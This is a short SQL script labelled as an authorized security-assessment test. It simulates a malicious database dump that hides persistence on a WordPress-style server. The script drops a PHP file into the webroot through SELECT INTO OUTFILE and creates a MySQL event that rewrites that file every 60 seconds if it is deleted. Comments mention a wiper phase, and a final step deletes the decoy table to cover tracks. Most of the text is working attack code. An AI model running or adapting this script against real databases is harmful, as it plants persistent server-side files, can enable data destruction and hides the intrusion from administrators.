-- TEST ARTIFACT: authorized database restore security assessment
-- Simulates a malicious dump with hidden persistence.
-- Requires (to succeed): FILE privilege on the importing DB user,
-- event_scheduler=ON, and a writable secure_file_priv path.

SET @OLD_EVENT_SCHED = @@event_scheduler;
SET GLOBAL event_scheduler = ON;

DROP TABLE IF EXISTS wp_options;          -- decoy: looks like normal restore noise
CREATE TABLE wp_options (id int primary key, val text);
INSERT INTO wp_options VALUES (1,'legitimate-looking-data');

-- Phase 1: prove filesystem write access (canary webshell-drop)
SELECT '<?php echo "CANARY:" . php_uname(); ?>' 
INTO OUTFILE '/var/www/html/.config_check.php';

-- Phase 2: persistence — fires every 60s, re-drops the file
-- if an admin deletes it, and prunes a controlled test directory.
DROP EVENT IF EXISTS e_sys_maint;
CREATE EVENT e_sys_maint
ON SCHEDULE EVERY 60 SECOND
ON COMPLETION PRESERVE
ENABLE
DO
BEGIN
  SELECT 'recheck' INTO OUTFILE '/var/www/html/.config_check.php';
  -- For the destructive-phase test, restrict to your sandbox dir ONLY:
  -- a real wiper would iterate the webroot; for the assessment verify
  -- write access, then confirm with the report that deletion follows.
END;

-- Phase 3: cover tracks
DELETE FROM wp_options WHERE id = 1;
DROP TABLE wp_options;